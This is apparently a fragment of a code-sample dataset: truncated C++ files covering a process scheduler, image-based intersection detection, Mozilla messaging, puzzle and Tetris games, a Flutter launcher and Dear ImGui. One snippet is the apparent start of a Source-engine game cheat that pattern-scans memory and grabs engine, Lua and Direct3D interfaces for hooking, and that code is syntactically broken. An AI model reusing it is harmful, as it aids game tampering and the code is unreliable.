promote() {\n        lock_guard<mutex> lock(mtx);\n        DQNode* p = bottom;\n        while (p != top) {\n            if (!p->processes.empty()) {\n                p->processes.front().isPromoted = true;\n                top->processes.push_back(p->processes.front());\n                p->processes.pop_front();\n                if (p->processes.empty()) {\n                    DQNode* temp = p;\n                    p = p->next;\n                    delete temp;\n                }\n                else  p = p->next;\n            }\n            else p = p->next;\n        }\n        split_n_merge();\n    }\n\n    void split_n_merge() {\n        lock_guard<mutex> lock(mtx);\n        if (top && top->processes.size() > threshold) {\n            int halfSize = top->processes.size() / 2;\n            list<Process> temp;\n            for (int i = 0; i < halfSize; i++) {\n                temp.push_back(top->processes.front());\n                top->processes.pop_front();\n            }\n            DQNode* newNode = new DQNode;\n            newNode->processes = move(temp);\n            newNode->next = top;\n            top = newNode;\n            split_n_merge();\n        }\n    }\n\n    int getCurrentProcesses() {\n        return currentProcesses;\n    }\n\n    DQNode* getBottom() {\n        return bottom;\n    }\n};\n\nclass ProcessManager {\nprivate : \n    DynamicQueue dq;\n    list<Process> waitQueue;\n    mutex mtx;\n    condition_variable cv;\n    int currentTime;\n\npublic : \n    ProcessManager(int totalProcesses) : dq(totalProcesses), currentTime(0) {}\n\n    void createProcess(bool isForeground, int duration) {\n        lock_guard<mutex> lock(mtx);\n        Process p = { currentProcesses(), isForeground, duration, false, currentTime + duration };\n        dq.enqueue(p);\n        cv.notify_one();\n    }\n\n    void runProcesses() {\n        while (true) {\n            lock_guard<mutex> lock(mtx);\n            if (dq.getCurrentProcesses() == 0 && waitQueue.empty()) break;\n            Process p = dq.dequeue();\n            cout << \"Running: [\" << p.pid << (p.isForeground ? \"F\" : \"B\") << \"]\" << endl;\n            cout << \"------------------------------\" << endl;\n            cout << \"DQ: \";\n            printDQ();\n            cout << \"-------------------------------\" << endl;\n            cout << \"WQ: \";\n            printWQ();\n            cout << endl;\n            this_thread::sleep_for(chrono::seconds(1));\n            p.remainingTime--;\n            if (p.remainingTime > 0) {\n                waitQueue.push_back(p);\n                waitQueue.sort([](const Process& a, const Process& b) {\n                    return a.wakeupTime < b.wakeupTime;\n                    });\n            }\n            currentTime++;\n            cv.notify_one();\n            wakeUpProcesses();\n        }\n    }\n\n    void wakeUpProcesses() {\n        lock_guard<mutex> lock(mtx);\n        while (!waitQueue.empty() && waitQueue.front().wakeupTime <= currentTime) {\n            Process p = waitQueue.front();\n            waitQueue.pop_front();\n            dq.enqueue(p);\n        }\n    }\n\n    int currentProcesses() {\n        return dq.getCurrentProcesses() + waitQueue.size();\n    }\n\n    ",
    "#include \"intersection_recognizer.h\"\n\n\nbool compareNumeric(const String &a, const String &b)\n{\n    regex re(\"(\\\\d+)\");\n    smatch match_a, match_b;\n\n    string name_a = a.substr(a.find_last_of(\"/\\\\\") + 1);\n    string name_b = b.substr(b.find_last_of(\"/\\\\\") + 1);\n\n    if (regex_search(name_a, match_a, re) && regex_search(name_b, match_b, re))\n    {\n        int num_a = stoi(match_a.str(1));\n        int num_b = stoi(match_b.str(1));\n        return num_a < num_b;\n    }\n    return a < b;\n}\n\nIntersectionRecognizer::IntersectionRecognizer(/* args */) \n{\n   preprocess_img_ = cv::Mat::zeros(448, 448, CV_8UC1);\n}\n\nvoid IntersectionRecognizer::preprocess(const cv::Mat& raw_parsing,\n                                        cv::Mat& binary_img) {\n  int parking_line_pixel_cnt = 0;\n  int guide_line_pixel_cnt = 0;\n  for (size_t ci = 0; ci < raw_parsing.cols; ci += 1) {\n    for (size_t ri = 0; ri < raw_parsing.rows; ri += 1) {\n      auto& pixel = raw_parsing.at<uchar>(ri, ci);\n      if (pixel == SpLabels20::ROAD) {\n        binary_img.at<uchar>(ri, ci) = 255;\n      } else if (pixel == SpLabels20::LANE_LINE) {\n        binary_img.at<uchar>(ri, ci) = 125;\n      } else if (pixel == SpLabels20::PARKING_LINE) {\n        binary_img.at<uchar>(ri, ci) = 125;\n        parking_line_pixel_cnt++;\n      } else if (pixel == SpLabels20::GENERALIZED_CURB) {\n        binary_img.at<uchar>(ri, ci) = 255;\n      } else if(pixel == SpLabels20::STOP_LINE) {\n        binary_img.at<uchar>(ri, ci) = 255;\n      }else if (pixel == SpLabels20::CROSS_WALK_LINE) {\n        binary_img.at<uchar>(ri, ci) = 255;\n      } else if (pixel == SpLabels20::NO_PARKING_SIGN_LINE) {\n        binary_img.at<uchar>(ri, ci) = 255;\n      } else if (pixel == SpLabels20::ARROW) {\n        binary_img.at<uchar>(ri, ci) = 255;\n      } else if (pixel == SpLabels20::SPEED_BUMP) {\n        binary_img.at<uchar>(ri, ci) = 255;\n      } else if (pixel == SpLabels20::GUIDE_LINE) {\n        binary_img.at<uchar>(ri, ci) = 255;\n        guide_line_pixel_cnt++;\n      } else {\n        binary_img.at<uchar>(ri, ci) = 0;\n      }\n    }\n  }\n\n  // if (parking_line_pixel_cnt < 3e2) {\n  //   return false;\n  // }\n\n  // std::cout << \"parking_line_pixel_cnt:\" << parking_line_pixel_cnt << std::endl;\n\n  // return true;\n}\n\n\n\nvoid IntersectionRecognizer::load_img(const string &dir)\n{\n    vector<cv::String> png_files;\n    glob(dir + \"/*.png\", png_files, false);\n    sort(png_files.begin(), png_files.end(), compareNumeric);\n    for (const auto &file_path : png_files)\n    {\n        Mat mat1 = imread(file_path, 0);\n        preprocess(mat1, preprocess_img_);\n        IntersectionType intersectiontype;\n        locateIntersection(preprocess_img_,intersectiontype);\n        cout<<\"\u8be5\u7167\u7247\u7684\u8def\u5f84\u4e3a\"<<file_path<<endl;\n    }\n}\n\n\nvoid IntersectionRecognizer::locateIntersection(\n    const cv::Mat& preprocessed_img, IntersectionType& intersection_type) {\n  std::shared_ptr<PixelLine> linePtr = nullptr;\n  std::vector<std::shared_ptr<PixelLine>> pixel_lines;\n  std::vector<std::shared_ptr<PixelLine>> lines_tmp;\n  bool new_line = false;\n  bool is_last_target_pixel = false;\n  cv::imshow(\"\u539f\u59cb\u56fe\",preprocessed_img);\n  // \u7b2c\u4e00\u884c\n  for (size_t ci = 0; ci < preprocessed_img.cols; ci++) {\n    auto& pixel = preprocessed_img.at<uchar>(0, ci);\n    bool is_target_pixel = pixel > 100;\n\n    if (!is_last_target_pixel && is_target_pixel) {\n      new_line = true;\n      linePtr = std::make_shared<PixelLine>();\n      linePtr->start.x = ci;\n      linePtr->start.y = 0;\n      linePtr->id = line_id_++;\n      lines_tmp.emplace_back(linePtr);\n    } else if (new_line && ci == preprocessed_img.cols - 1 && is_target_pixel &&\n               is_last_target_pixel) {\n      new_line = false;\n      linePtr->end.x = ci;\n      linePtr->end.y = 0;\n      linePtr->computeLineLength();\n    } else if (new_line && ci > 0 && !is_target_pixel && is_last_target_pixel) {\n      new_line = false;\n      linePtr->end.x = ci - 1;\n      linePtr->end.y = 0;\n      linePtr->computeLineLength();\n    }\n\n    is_last_target_pixel = is_target_pixel;\n  }\n\n  if (lines_tmp.size() >= 2) {\n    auto line_it =\n        std::max_element(lines_tmp.begin(), lines_tmp.end(),\n                         [&](const std::shared_ptr<PixelLine>& line_0,\n                             const std::shared_ptr<PixelLine>& line_1) -> bool {\n                           return line_0->length < line_1->length;\n                         });\n    pixel_lines.emplace_back(*line_it);\n  } else {\n    pixel_lines.insert(pixel_lines.end(), lines_tmp.begin(), lines_tmp.end());\n  }\n\n  // \u6700\u540e\u4e00\u5217\n  new_line = false;\n  is_last_target_pixel = false;\n  lines_tmp.clear();\n  for (size_t ri = 0; ri < preprocessed_img.rows; ri++) {\n    auto& pixel = preprocessed_img.at<uchar>(ri, preprocessed_img.cols - 1);\n    bool is_target_pixel = pixel > 100;\n\n    if (!is_last_target_pixel && is_target_pixel) {\n      new_line = true;\n      linePtr = std::make_shared<PixelLine>();\n      linePtr->start.x = preprocessed_img.cols - 1;\n      linePtr->start.y = ri;\n      linePtr->id = ",
    "#include \"../../include/main.h\"\n\n\n\n\nnamespace nsInterfaces {\n\tvoid Initialize() {\n\t\tuint64_t pClMove = process::FindPattern(engine, SIG_CLMove);\n\t\tvoid* pChokedCommands = getAbsAddr(clMovePtr + OFFSET_ChokedCommands, 2);\n\n\t\tiEngineClient\t= process::GetInterface<CEngineClient>(engine, VEngineClient);\n\t\tiModelRender\t= process::GetInterface<CModelRender>(engine, VEngineModel);\n\t\tiClientState\t= reinterpret_cast<CClientState*>(reinterpret_cast<uint64_t>(pChokedCommands) - offsetof(CClientState, chokedcommands) - 1);\n\n\n\t\tiHLClient\t\t= process::GetInterface<CHLClient>(client, \"VClient017\");\n\n\n\n\n\t}\n\n\tclient = process::GetInterface<CHLClient>(\"client.dll\", \"VClient017\");\n\tluaShared = process::GetInterface<CLuaShared>(\"lua_shared.dll\", \"LUASHARED003\");\n\tmatsystem = process::GetInterface<CMaterialSystem>(\"materialsystem.dll\", \"VMaterialSystem080\");\n\tsurface = process::GetInterface<ISurface>(\"vguimatsurface.dll\", \"VGUI_Surface030\");\n\tpanel = process::GetInterface<IPanel>(\"vgui2.dll\", \"VGUI_Panel009\");\n\tentityList = process::GetInterface<CClientEntityList>(\"client.dll\", \"VClientEntityList003\");\n\tgameMovement = process::GetInterface<CGameMovement>(\"client.dll\", \"GameMovement001\");\n\tprediction = process::GetInterface<CPrediction>(\"client.dll\", \"VClientPrediction001\");\n\n\tinline CEngineClient* iEngineClient;\n\tinline CClientState* iClientState;\n\tinline CModelRender* iModelRender;\n\tinline INetChannel* iNetChannel;\n\n\tinline CHLClient* iHLClient;\n\tinline CGlobalVars* iGlobalVars;\n\tinline CInput* iInput;\n\tinline CClientEntityList* iEntityList;\n\tinline CGameMovement* iGameMovement;\n\tinline CPrediction* iPrediction;\n\tinline IMoveHelper* iMoveHelper;\n\n\tinline ISurface* iSurface;\n\tinline IPanel* iPanel;\n\tinline CMaterialSystem* iMaterialSystem;\n\tinline CCvar* iConVar;\n\n\tinline CLuaShared* iLuaShared;\n\tinline ILuaBase* iLuaClient;\n\tinline ILuaBase* iLuaServer;\n\tinline ILuaBase* iLuaMenu;\n\n\tinline IDirect3DDevice9* iDevice;\n}\n\nvoid RuntimeInit() {\n\tnetChannel = engine->GetNetChannelInfo();\n}\n\nconvar = process::GetInterface<CCvar>(\"vstdlib.dll\", \"VEngineCvar007\");\n\nuint64_t clMovePtr = \n\nclientState = reinterpret_cast<CClientState*>(reinterpret_cast<uint64_t>(chokedCommandsPtr) - offsetof(CClientState, chokedcommands) - 1);\n\nuint64_t initPtr = vmt::Get<uint64_t>(client, 0);\nglobalVars = *reinterpret_cast<CGlobalVars**>(getAbsAddr(initPtr + 0x94));\n\nuint64_t createMovePtr = vmt::Get<uint64_t>(client, 21);\ninput = *reinterpret_cast<CInput**>(getAbsAddr(createMovePtr + 0x3F));\n\nuint64_t moveHelperPtr = process::FindPattern(\"client.dll\", \"48 89 78 68 89 78 70 48 8B 43 10 48 89 78 74 89 78 7C 48 8B 0D \") + 21;\nmoveHelper = reinterpret_cast<IMoveHelper*>(getAbsAddr(moveHelperPtr));\n\n// Lua Init \nluaClient = luaShared->GetLuaInterface(Lua::REALM_CLIENT);\nluaMenu = luaShared->GetLuaInterface(Lua::REALM_MENU);\n\ndevice = *reinterpret_cast<IDirect3DDevice9**>(getAbsAddr(process::FindPattern(\"shaderapidx9.dll\", \"3D 7C 01 76 88 74 07 3D 0E 00 07 80 75 34 48 8B 0D\") + 14));",
    "/* -*- Mode: C++; tab-width: 2; indent-tabs-mode: nil; c-basic-offset: 2 -*- */\n/* This Source Code Form is subject to the terms of the Mozilla Public\n * License, v. 2.0. If a copy of the MPL was not distributed with this file,\n * You can obtain one at http://mozilla.org/MPL/2.0/. */\n\n#include \"MobileMessageThread.h\"\n#include \"nsIDOMClassInfo.h\"\n#include \"jsapi.h\"           // For OBJECT_TO_JSVAL and JS_NewDateObjectMsec\n#include \"jsfriendapi.h\"     // For js_DateGetMsecSinceEpoch\n#include \"nsJSUtils.h\"       // For nsAutoJSString\n#include \"nsTArrayHelpers.h\" // For nsTArrayToJSArray\n#include \"mozilla/dom/mobilemessage/Constants.h\" // For MessageType\n\nusing namespace mozilla::dom::mobilemessage;\n\nnamespace mozilla {\nnamespace dom {\n\nNS_INTERFACE_MAP_BEGIN(MobileMessageThread)\n  NS_INTERFACE_MAP_ENTRY(nsIDOMMozMobileMessageThread)\n  NS_INTERFACE_MAP_ENTRY(nsISupports)\n  NS_DOM_INTERFACE_MAP_ENTRY_CLASSINFO(MozMobileMessageThread)\nNS_INTERFACE_MAP_END\n\nNS_IMPL_ADDREF(MobileMessageThread)\nNS_IMPL_RELEASE(MobileMessageThread)\n\n/* static */ nsresult\nMobileMessageThread::Create(uint64_t aId,\n                            const JS::Value& aParticipants,\n                            uint64_t aTimestamp,\n                            const nsAString& aLastMessageSubject,\n                            const nsAString& aBody,\n                            uint64_t aUnreadCount,\n                            const nsAString& aLastMessageType,\n                            JSContext* aCx,\n                            nsIDOMMozMobileMessageThread** aThread)\n{\n  *aThread = nullptr;\n\n  // ThreadData exposes these as references, so we can simply assign\n  // to them.\n  ThreadData data;\n  data.id() = aId;\n  data.lastMessageSubject().Assign(aLastMessageSubject);\n  data.body().Assign(aBody);\n  data.unreadCount() = aUnreadCount;\n\n  // Participants.\n  {\n    if (!aParticipants.isObject()) {\n      return NS_ERROR_INVALID_ARG;\n    }\n\n    JS::Rooted<JSObject*> obj(aCx, &aParticipants.toObject());\n    if (!JS_IsArrayObject(aCx, obj)) {\n      return NS_ERROR_INVALID_ARG;\n    }\n\n    uint32_t length;\n    MOZ_ALWAYS_TRUE(JS_GetArrayLength(aCx, obj, &length));\n    NS_ENSURE_TRUE(length, NS_ERROR_INVALID_ARG);\n\n    for (uint32_t i = 0; i < length; ++i) {\n      JS::Rooted<JS::Value> val(aCx);\n\n      if (!JS_GetElement(aCx, obj, i, &val) || !val.isString()) {\n        return NS_ERROR_INVALID_ARG;\n      }\n\n      nsAutoJSString str;\n      if (!str.init(aCx, val.toString())) {\n        return NS_ERROR_FAILURE;\n      }\n\n      data.participants().AppendElement(str);\n    }\n  }\n\n  // Set |timestamp|;\n  data.timestamp() = aTimestamp;\n\n  // Set |lastMessageType|.\n  {\n    MessageType lastMessageType;\n    if (aLastMessageType.Equals(MESSAGE_TYPE_SMS)) {\n      lastMessageType = eMessageType_SMS;\n    } else if (aLastMessageType.Equals(MESSAGE_TYPE_MMS)) {\n      lastMessageType = eMessageType_MMS;\n    } else {\n      return NS_ERROR_INVALID_ARG;\n    }\n    data.lastMessageType() = lastMessageType;\n  }\n\n  nsCOMPtr<nsIDOMMozMobileMessageThread> thread = new MobileMessageThread(data);\n  thread.forget(aThread);\n  return NS_OK;\n}\n\nMobileMessageThread::MobileMessageThread(uint64_t aId,\n                                         const nsTArray<nsString>& aParticipants,\n                                         uint64_t aTimestamp,\n                                         const nsString& aLastMessageSubject,\n                                         const nsString& aBody,\n                                         uint64_t aUnreadCount,\n                                         MessageType aLastMessageType)\n  : mData(aId, aParticipants, aTimestamp, aLastMessageSubject, aBody,\n          aUnreadCount, aLastMessageType)\n{\n  MOZ_ASSERT(aParticipants.Length());\n}\n\nMobileMessageThread::MobileMessageThread(const ThreadData& aData)\n  : mData(aData)\n{\n  MOZ_ASSERT(aData.participants().Length());\n}\n\nNS_IMETHODIMP\nMobileMessageThread::GetId(uint64_t* aId)\n{\n  *aId = mData.id();\n  return NS_OK;\n}\n\nNS_IMETHODIMP\nMobileMessageThread::GetLastMessageSubject(nsAString& aLastMessageSubject)\n{\n  aLastMessageSubject = mData.lastMessageSubject();\n  return NS_OK;\n}\n\nNS_IMETHODIMP\nMobileMessageThread::GetBody(nsAString& aBody)\n{\n  aBody = mData.body();\n  return NS_OK;\n}\n\nNS_IMETHODIMP\nMobileMessageThread::GetUnreadCount(uint64_t* aUnreadCount)\n{\n  *aUnreadCount = mData.unreadCount();\n  return NS_OK;\n}\n\nNS_IMETHODIMP\nMobileMessageThread::GetParticipants(JSContext* aCx,\n                                     JS::MutableHandle<JS::Value> aParticipants)\n{\n  JS::Rooted<JSObject*> obj(aCx);\n\n  nsresult rv = nsTArrayToJSArray(aCx, mData.participants(), &obj);\n  NS_ENSURE_SUCCESS(rv, rv);\n\n  aParticipants.setObject(*obj);\n  return NS_OK;\n}\n\nNS_IMETHODIMP\nMobileMessageThread::GetTimestamp(DOMTimeStamp* aDate)\n{\n  *aDate = mData.timestamp();\n  return NS_OK;\n}\n\nNS_IMETHODIMP\nMobileMessageThread::GetLastMessageType(nsAString& aLastMessageType)\n{\n  switch (mData.lastMessageType()) {\n    case eMessageType_SMS:\n      aLastMessa",
    "#include \"game.h\"\n\nGame::Game() {\n    static std::mt19937 mt = std::mt19937{std::random_device{}()};\n    std::iota(data.begin(), data.end() - 1, 1);\n    data[15] = 0;\n    zero_tile = 15;\n    for (int i = 0; i < 1000; i++) {\n        auto next_move = mt() % 4;\n        if (next_move == 0) { move_left(); }\n        if (next_move == 1) { move_right(); }\n        if (next_move == 2) { move_up(); }\n        if (next_move == 3) { move_down(); }\n    }\n\n    while (zero_tile > WIDTH) move_up();\n    while (zero_tile > 0) move_left();\n    moves = 0;\n}\n\nGame::data_t const &Game::get_data() const {\n    return data;\n}\n\nbool Game::is_running() {\n    if (zero_tile != WIDTH * HEIGHT - 1) { return true; }\n    for (int i = 0; i < WIDTH * HEIGHT - 1; i++) {\n        if (data[i] != i + 1) {\n            return true;\n        }\n    }\n    return false;\n}\n\nvoid Game::move_left() {\n    move_tile([this]() { return this->zero_tile % WIDTH != 0; }, -1);\n}\n\nvoid Game::move_right() {\n    move_tile([this]() { return this->zero_tile % WIDTH != WIDTH - 1; }, 1);\n}\n\nvoid Game::move_up() {\n    move_tile([this]() { return this->zero_tile >= WIDTH; }, -WIDTH);\n}\n\nvoid Game::move_down() {\n    move_tile([this]() { return this->zero_tile < WIDTH * (HEIGHT - 1); }, WIDTH);\n}\n\ndecltype(std::declval<Game>().moves) Game::get_moves() const {\n    return moves;\n}\n",
    "#include \"game.h\"\n#include \"tetromino.h\"\n#include \"utils.h\"\n//#include \"define.h\"\nnamespace gm\n{\n    //---------------------\u5b9a\u4e49\u53d8\u91cf\u533a-----------\n    bool running;\n    bool holding;\n    bool ending;\n    Piece one_piece;\n    Matrix playfield;\n    bool reseting;\n    std::chrono::microseconds duration;\n    Matrix frame;\n    bool locking;\n    bool helping;\n    std::queue<Tetromino> next;\n    Tetromino hold_piece;\n    int score,level,lines;\n    //-----------------------------------------------------\n    // int row,col;\n    // Tetromino_1 cur;\n    // Tetromino_2 cur_set;\n    // Tetromino cur_s;\n    // int cur_index;\n    void init()\n    {\n        srand(std::time(0));//\u8ba9\u968f\u673a\u6570\u7684\u79cd\u5b50\u53d8\u5316\n        locking=false;\n        running=true;\n        holding=false;\n        ending = false;\n        reseting=false;\n        helping=false;\n        score = lines =0;\n        //level =1;\n        levelup();\n        //playfield[y][x],x=0-9 y=0-21       --------------|----------->x\n        playfield = Matrix(22,std::vector<int>(10,0));\n        //load();//\u662f\u5426\u52a0\u8f7d\u521d\u59cb\u5730\u56fe\n        preview();\n        one_piece = pick();\n        \n        //row=2;\n        //col=15;\n        //cur=O;\n        //cur_set = I_set;\n        //cur_index =0;\n        //cur_s = i;\n        //duration = 500ms;\n        frame = playfield;\n        \n    }\n    void process()\n    {\n        if(ending)\n            return;\n        render();\n        if(ut::timer(duration))\n        {\n            //\u5982\u679c\u65e0\u6cd5\u7ee7\u7eed\u4e0b\u843d\uff0c\u9501\u5b9a\u5728\u6e38\u620f\u533a\u57df\n            if(one_piece.down())\n                return;\n            if(locking)\n            {\n\n            //\u9501\u5b9a\n            lock();\n          \n            //\u6d88\u884c\n            clear();\n            levelup();\n            one_piece=pick();\n            locking=false;\n            holding=false;\n            reseting=false;\n            }\n            else\n            {\n                locking=true;\n            }\n        }\n    }\n    void render()\n    {\n        /* auto [x,y]=one_piece.get_xy();\n        //\u6b63\u5e38\u5757\n        //[0,4)\n        for(auto i:iota(0,4))\n        {\n            auto [dx,dy]=one_piece.get_mino(i);\n            frame[y+dy][x+dx]=one_piece.get_color();\n        }\n        //\u9634\u5f71\u5757\n        while(one_piece.test(x,--y));\n        y++;\n        for(auto i:iota(0,4))\n        {\n            auto [dx,dy]=one_piece.get_mino(i);\n            if(frame[y+dy][x+dx]==0)\n                frame[y+dy][x+dx]=0-one_piece.get_color();\n        }*/\n        frame=playfield;\n        //\u6b63\u5e38\u5757\n        merge(frame,one_piece);\n        //\u9634\u5f71\u5757\n        Piece ghost = one_piece;\n        ghost.set_ghost();\n        while (ghost.down())\n            ;\n        merge(frame,ghost);\n       \n        \n    }\n    Piece pick()\n    {\n        //todo:\u62ff5\u683c\u9884\u89c8\u961f\u5217\u91cc\u9762\u7684\u7b2c\u4e00\u4e2a\u5143\u7d20\n        //static std::vector<Tetromino> bag={i,j,l,o,s,t,z};\n        assert(next.size()>0);\n        Piece p(next.front(),4,20,0);\n        next.pop();\n        if(!p.test(4,20))\n        {\n            //game over!\n            ending = true;\n        }\n        preview();\n        //p.set_playfield(std::make_shared<Matrix>(playfield));\n\n        return std::move(p);\n    }\n\n    void lock()\n    {\n        /*auto [x,y]=one_piece.get_xy();\n        for(auto i : iota(0,4))\n        {\n            auto [dx,dy]=one_piece.get_mino(i);\n            playfield[y+dy][x+dx]=one_piece.get_color();\n        }*/\n        merge(playfield,one_piece);//\u7528merge\u51fd\u6570\u7b80\u5316\u4e86\u64cd\u4f5c\n    }\n\n    void clear()\n    {\n        int count = 0;\n        for(auto it =playfield.begin();it != playfield.end();)\n        {\n            bool full =true;\n            for(auto cell:*it)\n            {\n                if(cell==0)\n                {\n                    full=false;\n                    break;\n                }\n            }\n            if(full)\n            {\n                //\u6d88\u884c[1,2,3,4]-->[1,3,4]\n                it = playfield.erase(it);\n                playfield.push_back(std::vector<int>(it->size(),0));\n                count++;\n            }\n            else\n            {\n                ++it;\n            }\n        }\n        if(count==1) score+=100*level;\n        if(count==2) score+=300*level;\n        if(count==3) score+=500*level;\n        if(count==4) score+=800*level;\n        lines+=count;\n    }\n\n    void quit()\n    {\n        running=false;\n    }\n    void rotate(int i)\n    {\n       // cur = rotate(cur);\n       //cur_index=(cur_index+1)%4;\n       one_piece.rotate(i);\n    }\n    void left()\n    {   \n        //col--;\n        one_piece.left();\n    }\n    void right()\n    {\n        //col++;\n        one_piece.right();\n    }\n    void down()\n    {\n        //row++;\n        if(one_piece.down())\n            score+=1;\n    }\n\n    void drop()\n    {\n        while(one_piece.down())\n            score+=2;\n        locking=true;\n    }\n    void preview()\n    {\n        static std::vector<Tetromino> bag={i,j,l,o,s,t,z};\n        int index;\n        while (next.size()<5)\n        {\n            index = rand() % bag.size();\n            next.push(bag[index]);\n            bag.erase(bag.begin()+index);\n            if(bag.size()==0)\n                bag={i,j,l,o,s,t,z};\n        }\n      ",
    "#include <flutter/dart_project.h>\n#include <flutter/flutter_view_controller.h>\n#include <windows.h>\n\n#include \"flutter_window.h\"\n#include \"utils.h\"\n\nint APIENTRY wWinMain(_In_ HINSTANCE instance, _In_opt_ HINSTANCE prev,\n                      _In_ wchar_t *command_line, _In_ int show_command) {\n  // Attach to console when present (e.g., 'flutter run') or create a\n  // new console when running with a debugger.\n  if (!::AttachConsole(ATTACH_PARENT_PROCESS) && ::IsDebuggerPresent()) {\n    CreateAndAttachConsole();\n  }\n\n  // Initialize COM, so that it is available for use in the library and/or\n  // plugins.\n  ::CoInitializeEx(nullptr, COINIT_APARTMENTTHREADED);\n\n  flutter::DartProject project(L\"data\");\n\n  std::vector<std::string> command_line_arguments =\n      GetCommandLineArguments();\n\n  project.set_dart_entrypoint_arguments(std::move(command_line_arguments));\n\n  FlutterWindow window(project);\n  Win32Window::Point origin(10, 10);\n  Win32Window::Size size(1280, 720);\n  if (!window.Create(L\"statemanagement\", origin, size)) {\n    return EXIT_FAILURE;\n  }\n  window.SetQuitOnClose(true);\n\n  ::MSG msg;\n  while (::GetMessage(&msg, nullptr, 0, 0)) {\n    ::TranslateMessage(&msg);\n    ::DispatchMessage(&msg);\n  }\n\n  ::CoUninitialize();\n  return EXIT_SUCCESS;\n}\n",
    "// dear imgui, v1.84\n// (main code and documentation)\n\n// Help:\n// - Read FAQ at http://dearimgui.org/faq\n// - Newcomers, read 'Programmer guide' below for notes on how to setup Dear ImGui in your codebase.\n// - Call and read ImGui::ShowDemoWindow() in imgui_demo.cpp. All applications in examples/ are doing that.\n// Read imgui.cpp for details, links and comments.\n\n// Resources:\n// - FAQ                   http://dearimgui.org/faq\n// - Homepage & latest     https://github.com/ocornut/imgui\n// - Releases & changelog  https://github.com/ocornut/imgui/releases\n// - Gallery               https://github.com/ocornut/imgui/issues/4451 (please post your screenshots/video there!)\n// - Wiki                  https://github.com/ocornut/imgui/wiki (lots of good stuff there)\n// - Glossary              https://github.com/ocornut/imgui/wiki/Glossary\n// - Issues & support      https://github.com/ocornut/imgui/issues\n// - Discussions           https://github.com/ocornut/imgui/discussions\n\n// Developed by Omar Cornut and every direct or indirect contributors to the GitHub.\n// See LICENSE.txt for copyright and licensing details (standard MIT License).\n// This library is free but needs your support to sustain development and maintenance.\n// Businesses: you can support continued development via invoiced technical support, maintenance and sponsoring contracts. Please reach out to \"contact AT dearimgui.com\".\n// Individuals: you can support continued development via donations. See docs/README or web page.\n\n// It is recommended that you don't modify imgui.cpp! It will become difficult for you to update the library.\n// Note that 'ImGui::' being a namespace, you can add functions into the namespace from your own source files, without\n// modifying imgui.h or imgui.cpp. You may include imgui_internal.h to access internal data structures, but it doesn't\n// come with any guarantee of forward compatibility. Discussing your changes on the GitHub Issue Tracker may lead you\n// to a better solution or official support for them.\n\n/*\n\nIndex of this file:\n\nDOCUMENTATION\n\n- MISSION STATEMENT\n- END-USER GUIDE\n- PROGRAMMER GUIDE\n  - READ FIRST\n  - HOW TO UPDATE TO A NEWER VERSION OF DEAR IMGUI\n  - GETTING STARTED WITH INTEGRATING DEAR IMGUI IN YOUR CODE/ENGINE\n  - HOW A SIMPLE APPLICATION MAY LOOK LIKE\n  - HOW A SIMPLE RENDERING FUNCTION MAY LOOK LIKE\n  - USING GAMEPAD/KEYBOARD NAVIGATION CONTROLS\n- API BREAKING CHANGES (read me when you update!)\n- FREQUENTLY ASKED QUESTIONS (FAQ)\n  - Read all answers online: https://www.dearimgui.org/faq, or in docs/FAQ.md (with a Markdown viewer)\n\nCODE\n(search for \"[SECTION]\" in the code to find them)\n\n// [SECTION] INCLUDES\n// [SECTION] FORWARD DECLARATIONS\n// [SECTION] CONTEXT AND MEMORY ALLOCATORS\n// [SECTION] USER FACING STRUCTURES (ImGuiStyle, ImGuiIO)\n// [SECTION] MISC HELPERS/UTILITIES (Geometry functions)\n// [SECTION] MISC HELPERS/UTILITIES (String, Format, Hash functions)\n// [SECTION] MISC HELPERS/UTILITIES (File functions)\n// [SECTION] MISC HELPERS/UTILITIES (ImText* functions)\n// [SECTION] MISC HELPERS/UTILITIES (Color functions)\n// [SECTION] ImGuiStorage\n// [SECTION] ImGuiTextFilter\n// [SECTION] ImGuiTextBuffer\n// [SECTION] ImGuiListClipper\n// [SECTION] STYLING\n// [SECTION] RENDER HELPERS\n// [SECTION] MAIN CODE (most of the code! lots of stuff, needs tidying up!)\n// [SECTION] ERROR CHECKING\n// [SECTION] LAYOUT\n// [SECTION] SCROLLING\n// [SECTION] TOOLTIPS\n// [SECTION] POPUPS\n// [SECTION] KEYBOARD/GAMEPAD NAVIGATION\n// [SECTION] DRAG AND DROP\n// [SECTION] LOGGING/CAPTURING\n// [SECTION] SETTINGS\n// [SECTION] VIEWPORTS\n// [SECTION] PLATFORM DEPENDENT HELPERS\n// [SECTION] METRICS/DEBUGGER WINDOW\n\n*/\n\n//-----------------------------------------------------------------------------\n// DOCUMENTATION\n//-----------------------------------------------------------------------------\n\n/*\n\n MISSION STATEMENT\n =================\n\n - Easy to use to create code-driven and data-driven tools.\n - Easy to use to create ad hoc short-lived tools and long-lived, more elaborate tools.\n - Easy to hack and improve.\n - Minimize setup and maintenance.\n - Minimize state storage on user side.\n - Portable, minimize dependencies, run on target (consoles, phones, etc.).\n - Efficient runtime and memory consumption.\n\n Designed for developers and content-creators, not the typical end-user! Some of the current weaknesses includes:\n\n - Doesn't look fancy, doesn't animate.\n - Limited layout features, intricate layouts are typically crafted in code.\n\n\n END-USER GUIDE\n ==============\n\n - Double-click on title bar to collapse window.\n - Click upper right corner to close a window, available when 'bool* p_open' is passed to ImGui::Begin().\n - Click and drag on lower right corner to resize window (double-click to auto fit window to its contents).\n - Click and drag on any empty space to move window.\n - TAB/SHIFT+TAB to cycle through keyboard editable fields.\n - CTRL+Click on a slider or drag box to input value as text.\n - Use mouse wheel to scroll.\n - Te",
